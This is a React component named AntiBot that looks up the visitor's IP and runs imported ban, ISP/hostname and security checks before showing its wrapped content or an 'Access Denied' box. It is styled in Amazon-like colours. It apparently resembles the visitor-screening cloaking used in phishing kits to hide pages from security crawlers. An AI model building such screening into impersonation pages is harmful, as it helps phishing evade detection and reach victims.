import React, { useEffect, useState } from "react";
import { performSecurityCheck } from "../services/securityCheck";
import { checkISP, checkHostname } from "../services/ispCheck";
import { checkIfBanned } from "../services/banCheck";

const AntiBot = ({ children }) => {
  const [isBlocked, setIsBlocked] = useState(false);
  const [loading, setLoading] = useState(true);
  const [blockReason, setBlockReason] = useState("");

  useEffect(() => {
    const checkSecurity = async () => {
      try {
        // Get client IP first
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipResponse.json();

        // Check if IP is banned
        const isBanned = await checkIfBanned(ip);
        if (isBanned) {
          return;
        }

        // Check hostname
        const hostnameAllowed = await checkHostname(ip);
        if (!hostnameAllowed) {
          setBlockReason("Access denied: Blocked network detected");
          setIsBlocked(true);
          setLoading(false);
          return;
        }

        // Perform security checks
        const securityCheck = await performSecurityCheck();
        if (securityCheck.blocked) {
          setBlockReason(securityCheck.reason);
          setIsBlocked(true);
        }
      } catch (error) {
        console.error("Security check error:", error);
        setIsBlocked(true);
        setBlockReason("Unable to verify security requirements");
      } finally {
        setLoading(false);
      }
    };

    checkSecurity();
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="animate-spin rounded-full h-12 w-12 border-4 border-[#232f3e] border-t-transparent"></div>
      </div>
    );
  }

  if (isBlocked) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-white">
        <div className="w-full max-w-[600px] bg-[#FFF5CC] border border-[#FFD814] rounded-lg p-6 mt-8 text-center">
          <h1 className="text-xl font-medium mb-4 text-[#C40000]">
            Access Denied
          </h1>
          <p className="text-sm text-[#0F1111]">{blockReason}</p>
        </div>
      </div>
    );
  }

  return children;
};

export default AntiBot;
